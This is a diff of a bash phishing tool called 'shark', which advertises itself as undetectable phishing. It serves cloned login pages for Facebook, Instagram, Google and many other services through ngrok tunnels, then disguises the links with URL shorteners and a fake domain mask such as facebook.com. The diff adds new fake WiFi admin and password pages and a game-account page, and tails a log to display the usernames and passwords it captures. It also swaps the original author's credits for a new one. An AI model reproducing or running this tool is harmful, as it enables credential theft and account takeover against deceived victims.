@@ -3,12 +3,9 @@
 ##############################################
 #                                            #
 #             PROJECT: SHARK                 #
-#             AUTHOR: ASHISH                 #
-#              SHARK ©2020                   #
-#     EMAIL: ashishsingh103020@gmail.com     #
-#           BEST PHISHING TOOLS              #              
-#       created by :- a s h i s h            #
-#                                            #
+#              SHARK ©2021                   #         
+#           BEST PHISHING TOOLS              #                                
+#       Reborn by :- M r. D e r e K          #
 ##############################################
 
 #########
@@ -35,7 +32,7 @@ nc="\033[0m"                                                ##
 # VERSION
 ##########
 
-VERSION="2.0.4"
+VERSION="2.5"
 
 ################
 # PRINT MESSAGE
@@ -58,7 +55,7 @@ error_msg() {
 #######
 
 arch=`uname -m`
-
+ArNam=$(dpkg --print-architecture)
 #spinner
 spinner() {
         pid=$!
@@ -124,12 +121,12 @@ function os () {
 function main_update() {
 	launch="updating shark"
 	splashdown="updated shark";echo
-	os;(wget -q https://github.com/Bhaviktutorials/shark/raw/master/shark -O ${shark}/shark && rm -rf ${old_shark} && cp -rf ${shark}/shark $BIN && chmod 777 $BIN/shark) & spinner
+	os;(wget -q https://github.com/tech2gamer/shark/raw/master/shark -O ${shark}/shark && rm -rf ${old_shark} && cp -rf ${shark}/shark $BIN && chmod 777 $BIN/shark) & spinner
 }
 
 
 function update() {
-	version=$(curl -L -s https://raw.githubusercontent.com/Bhaviktutorials/shark/master/shark | grep -w "VERSION=" | head -n1)
+	version=$(curl -L -s https://raw.githubusercontent.com/tech2gamer/shark/master/shark | grep -w "VERSION=" | head -n1)
 	latest_version=$(echo ${version} | sed -e 's/[^0-9]\+[^0-9]/ /g' | cut -d '"' -f1)
 	if [ "${1}" != "-u" ] || [ "${1}" != "--update" ]; then
 		[ ${latest_version} != ${VERSION} ] && echo && msg "shark update is available !!" && sleep 2.5 && echo && msg "Run shark -u , shark --update" && echo && exit 1;	       
@@ -159,7 +156,7 @@ function connection() {
 
 function check_update() {	
         connection
-        version=$(curl -L -s https://raw.githubusercontent.com/Bhaviktutorials/shark/master/shark | grep -w "VERSION=" | head -n1)
+        version=$(curl -L -s https://raw.githubusercontent.com/tech2gamer/shark/master/shark | grep -w "VERSION=" | head -n1)
 	latest_version=$(echo ${version} | sed -e 's/[^0-9]\+[^0-9]/ /g' | cut -d '"' -f1)
         if [ ${latest_version} = ${VERSION} ];then		
                 echo -e "\tReading \tpackage \tlists... \tDone
@@ -182,7 +179,6 @@ usage() {
 Usage: $(basename $0) [OPTIONS] available
 shark - future of phishing is here,
 A shark is a tool that will help you \do Phishing \in an advanced way so no one checks and identify that you are doing phishing.
-Copyright 2020 <ashishsingh103020@gmail.com>
 Options:
   -u, --update      Update shark
   -v, --version     Display the current shark version installed on your device
@@ -223,7 +219,11 @@ function fix_ngrok() {
 	if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
 			ngrok_url="https://github.com/Linux-Droid/Ngrok/raw/master/Ngrok_Linux_Droid.zip"
 		elif [[ "$arch" == *'aarch64'* ]]; then
-			ngrok_url="https://github.com/Linux-Droid/Ngrok/raw/master/Ngrok_Linux_Droid.zip"
+		         if [[ "$ArNam" == *'amd64'* ]]; then
+                              ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip"
+                        else
+                              ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip"
+		         fi
 		elif [[ "$arch" == *'x86_64'* ]]; then
 			ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip"
 		else
@@ -334,9 +334,16 @@ function url_checker() {
 
 # URL_SHORTNER
 function url_shortner() {	
-	# echo `wget -q -O - http://tny.im/yourls-api.php?action=shorturl\&format=simple\&url=${link}\&keyword=$2
-        short=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${ngrok_url})
-        shorter=${short#https://}       
+	#short=$(curl -s http://tny.im/yourls-api.php?action=shorturl\&format=simple\&url=${ngrok_url})
+	#short=$(curl -s https://vurl.com/api.php?url=${ngrok_url})
+	derek=$(curl -s https://is.gd/create.php\?format\=simple\&url=${ngrok_url})
+        #checking for is.gd is working or not.
+        if [[ $derek == https://is.gd/[-0-9a-zA-Z]* ]]; then
+        shorter=${derek#https://}
+        else
+        short=$(curl -s https://soo.gd/api.php?url=${ngrok_url})
+        shorter=${short#https://}
+        fi    
         read -p $'\n\033[1;92mshark \033[1;97m>> \033[1;37mMask Your url domain here \033[1;93m(Ex. https://facebook.com) :\e[0m ' mask
         url_checker $mask	
 	printf "${green}shark ${white}>> ${white}Enter your key words ${yellow}: Ex. free-insta-followers\n"        
@@ -349,7 +356,36 @@ function url_shortner() {
 
 # MAIN 
 function main() {
-        HOST="127.0.0.1" ; PORT="8080" ; launch="starting shark server"; splashdown="started shark server";printf "\n"; connection;php -S "$HOST":"$PORT" > /dev/null 2>&1 & sleep 0.1;ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & sleep 20 & spinner;ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io");url_shortner;
+HOST="127.0.0.1"
+echo
+read -p $'\e[1;32m\e[96m Do You want to enter port?\e[1;91m (Y/N):' drk
+if [[ $drk == y || $drk == Y ]]; then
+echo ""
+read -p $'\e[1;32m\e[96m Please Enter Your Port \e[1;92mEx.3246: \e[0m' PORT
+
+if [[ -z "$PORT" ]]; then
+echo
+echo -e ${red}"Bro you didn't mentioned anything."
+echo
+echo -e ${green}"restarting your option No.$option...."
+sleep 2
+main
+fi
+launch="starting shark server"; splashdown="started shark server";printf "\n"; connection;php -S "$HOST":"$PORT" > /dev/null 2>&1 & sleep 2; ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & sleep 20 & spinner;ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io");url_shortner;
+elif [[ $drk == n || $drk == N ]]; then
+PORT="8686"
+echo
+printf "${cyan1}Your Default Port is $PORT !${white} \n"
+sleep 2
+launch="starting shark server"; splashdown="started shark server";printf "\n"; connection;php -S "$HOST":"$PORT" > /dev/null 2>&1 & sleep 2; ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & sleep 20 & spinner;ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io");url_shortner;
+else
+	echo
+	echo -e ${red}"bro you type wrong..."
+	sleep 2
+	main
+fi
+
+#launch="starting shark server"; splashdown="started shark server";printf "\n"; connection;php -S "$HOST":"$PORT" > /dev/null 2>&1 & sleep 0.1;ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & sleep 20 & spinner;ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io");url_shortner
 }
 
 #banner2
@@ -360,13 +396,17 @@ banner2() {
         ║${white}   ║  ├┬┘├┤  ││├┤ │││ │ │├─┤│  └─┐${green}  ║
         ║${white}   ╚═╝┴└─└─┘─┴┘└─┘┘└┘ ┴ ┴┴ ┴┴─┘└─┘${green}  ║
         ╚════════════════════════════════════╝
-     
-        Author    : ${white}Ashish Singh${green}                 
-        Github    : ${white}github.com/Bhaviktutorials${green}   
-        Publisher : ${white}Bhavik Oza${green}                   
-     
-        >> ${white}${final_url}${green} \n
-\e[38;5;214m ░▒▓█ ░▒▓█▓▒░▒▓█▓▒░▒▓\e[1;34m░▒▓█ ░▒▓█▓▒░▒▓█▓▒░▒▓\e[1;92m░▒▓█ ░▒▓█▓▒░▒▓█▓▒░▒▓${green}\n\n"	
+
+        SHARK BETA : ${white}v${VERSION}${green}
+         Reborn by : ${white}Mr.Derek(t2g)${green}
+         Publisher : ${white}Bhavik Oza${green}
+	    Author : ${white}Ashish Singh${green}
+	     Note  : ${yellow}Soon will add New Features!${yellow}
+
+        》 ${cyan1}${final_url}${yellow} 《 MODIFIED URL. 
+                	or                 
+        》 ${cyan1}${ngrok_url}${yellow} 《 NGROK URL.\n
+\e[38;5;214m ░▒▓█ ░▒▓█▓▒░▒▓█▓▒░▒▓\e[1;34m░▒▓█ ░▒▓█▓▒░▒▓█▓▒░▒▓\e[1;92m░▒▓█ ░▒▓█▓▒░▒▓█▓▒░▒▓${cyan1}\n\n"	
 }
 
 #credentials
@@ -442,8 +482,8 @@ function camera_hack() {
 # Voice Hack
 
 function audio_hack() {	
-        default_redirect="https://www.youtube.com/channel/UCMhYgk0-nIHHtnRNkL9zpgQ/about"
-        printf "\n${green}[${white}+${green}] Choose a distracting website ${white}(Default: https://youtube.com) : " $default_redirect && read redirect_link
+        default_redirect="https://google.com"
+        printf "\n${green}[${white}+${green}] Choose a distracting website ${white}(Default: https://google.com) : " $default_redirect && read redirect_link
         redirect_link="${redirect_link:-${default_redirect}}";link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
         sed 's+forwarding_link+'$link'+g' template.php > index.php;sed 's+redirect_link+'$redirect_link'+g' js/_app.js > js/app.js
 	main
@@ -481,17 +521,17 @@ do
        ╚█████╗ ███████║███████║██████╔╝█████═╝${white}
         ╚═══██╗██╔══██║██╔══██║██╔══██╗██╔═██╗
        ██████╔╝██║  ██║██║  ██║██║  ██║██║ ╚██╗
-       ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ v ${VERSION}\n\n "
+       ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ${cyan1} .beta v${VERSION} \n                                     ${yellow}Reborn by Mr.Derek(t2g)\n\n "
 
-      printf "${green}      ╔──────────────────────────────────────╗\n"
-      printf "${green}       |${white}    c r e a t e d  b y  a s h i s h ${green}  |\n"
-      printf "${green}       ╚──────────────────────────────────────╝\n\n"
+      printf "${green}       ╔──────────────────────────────────────╗\n"
+      printf "${green}        |   ${cyan1}     B E T A   V E R S I O N ${green}      |\n"
+      printf "${green}        ╚──────────────────────────────────────╝\n\n"
 
      printf "           ${green}💻 \e[1;4;5;37mSelect An Attack To Deploy\e[0m${green} 💻\n\n"
 function banner(){	
-        printf "\e[1;92m[\e[0m\e[1;37m01\e[0m\e[1;92m] \e[0m\e[1;37;44mFacebook\e[0m           \e[1;92m[\e[0m\e[1;37m12\e[0m\e[1;92m] \e[0m\e[1;37;104mLinkedin\e[0m          \e[1;92m[\e[0m\e[1;37m23\e[0m\e[1;92m] \e[0m\e[1;37;44mWordpress\e[0m\n\n"
-        printf "\e[1;92m[\e[0m\e[1;37m02\e[0m\e[1;92m] \e[0m\e[1;37;41mPinterest\e[0m          \e[1;92m[\e[0m\e[1;37m13\e[0m\e[1;92m] \e[0m\e[1;37;46mHotstar\e[0m           \e[1;92m[\e[0m\e[1;37m24\e[0m\e[1;92m] \e[0m\e[1;37;43mSnapchat\e[0m\n\n" 
-        printf "\e[1;92m[\e[0m\e[1;37m03\e[0m\e[1;92m] \e[0m\e[1;48;5;200mInstagram\e[0m          \e[1;92m[\e[0m\e[1;37m14\e[0m\e[1;92m] \e[0m\e[1;37;42mSpotify\e[0m           \e[1;92m[\e[0m\e[1;37m25\e[0m\e[1;92m] \e[0m\e[1;37;40mProtonmail\e[0m\n\n"
+        printf "\e[1;92m[\e[0m\e[1;37m01\e[0m\e[1;92m] \e[0m\e[1;37;44mFacebook\e[0m           \e[1;92m[\e[0m\e[1;37m12\e[0m\e[1;92m] \e[0m\e[1;37;104mLinkedin\e[0m          \e[1;92m[\e[0m\e[1;37m23\e[0m\e[1;92m] \e[0m\e[1;37;44mWordpress\e[0m          \e[1;92m[\e[0m\e[1;37m33\e[0m\e[1;92m] \e[0m\e[1;37;46mWIFI-(adminpanel)\e[0m\n\n"
+        printf "\e[1;92m[\e[0m\e[1;37m02\e[0m\e[1;92m] \e[0m\e[1;37;41mPinterest\e[0m          \e[1;92m[\e[0m\e[1;37m13\e[0m\e[1;92m] \e[0m\e[1;37;46mHotstar\e[0m           \e[1;92m[\e[0m\e[1;37m24\e[0m\e[1;92m] \e[0m\e[1;37;43mSnapchat\e[0m           \e[1;92m[\e[0m\e[1;37m34\e[0m\e[1;92m] \e[0m\e[1;48;5;4mWIFI-(passwd)\e[0m\n\n"            
+        printf "\e[1;92m[\e[0m\e[1;37m03\e[0m\e[1;92m] \e[0m\e[1;48;5;200mInstagram\e[0m          \e[1;92m[\e[0m\e[1;37m14\e[0m\e[1;92m] \e[0m\e[1;37;42mSpotify\e[0m           \e[1;92m[\e[0m\e[1;37m25\e[0m\e[1;92m] \e[0m\e[1;37;40mProtonmail\e[0m         \e[1;92m[\e[0m\e[1;37m35\e[0m\e[1;92m] \e[0m\e[1;37;42mGameid-hack\e[0m\n\n"
         printf "\e[1;92m[\e[0m\e[1;37m04\e[0m\e[1;92m] \e[0m\e[1;37;40mUber \e[1;37;42mEats\e[0m          \e[1;92m[\e[0m\e[1;37m15\e[0m\e[1;92m] \e[0m\e[1;37;40mGithub\e[0m            \e[1;92m[\e[0m\e[1;37m26\e[0m\e[1;92m] \e[0m\e[1;38;5;209m\e[40mStackoverflow\e[0m\n\n" 
         printf "\e[1;92m[\e[0m\e[1;37m05\e[0m\e[1;92m] \e[0m\e[1;93;40mOLA\e[0m                \e[1;92m[\e[0m\e[1;37m16\e[0m\e[1;92m] \e[0m\e[1;37;43mIPFinder\e[0m          \e[1;92m[\e[0m\e[1;37m27\e[0m\e[1;92m] \e[0m\e[1;40m\e[91mE\e[94mb\e[93ma\e[92my\e[0m\n\n"  
         printf "\e[1;92m[\e[0m\e[1;37m06\e[0m\e[1;92m] \e[0m\e[1;40m\e[94mG\e[91mO\e[93mO\e[94mG\e[92mL\e[91mE\e[0m             \e[1;92m[\e[0m\e[1;37m17\e[0m\e[1;92m] \e[0m\e[1;37;101mZomato\e[0m            \e[1;92m[\e[0m\e[1;37m28\e[0m\e[1;92m] \e[0m\e[1;48;5;129mTwitch\e[0m\n\n"           
@@ -698,10 +738,28 @@ function banner(){
 		cd $phish/Audio_hack && file_check
                 audio_hack
 		break;
-			   
-	elif [ $option = 99 ];then		
-		printf "\n" && exit 
-		break;
+
+        elif [ $option = 33 ];then		
+                cd $phish/wiapp/ && main
+                credentials
+                tail -f log.txt | grep -e "Username:" -e "Password:"
+                break;
+        
+        elif [ $option = 34 ];then		
+                cd $phish/wip/ && main
+                credentials
+                tail -f log.txt | grep -e "Password:"
+                break;
+        
+        elif [ $option = 35 ];then		
+                cd $phish/gidp/ && main
+                credentials
+                tail -f log.txt | grep -e "Game:" -e "Email:" -e "Password:"
+                break;
+        
+        elif [ $option = 99 ];then
+                printf "\n" && exit
+                break;
 
 	else		
 		printf "\n${green}[${yellow}!${green}${red} Invalid option Try Again !!${white}\n"
@@ -712,8 +770,7 @@ done
 		  
 #####################################################################
 #                                                                   #
-#      simply changing this banner will not make you developer      #
-#                   CREATED BY ASHISH                               #
+#      simply changing this banner will not make you developer      #                                                  #
 #                   KEEP SUPPORTING                                 #
 #                      THANKYOU                                     #
 #                                                                   #
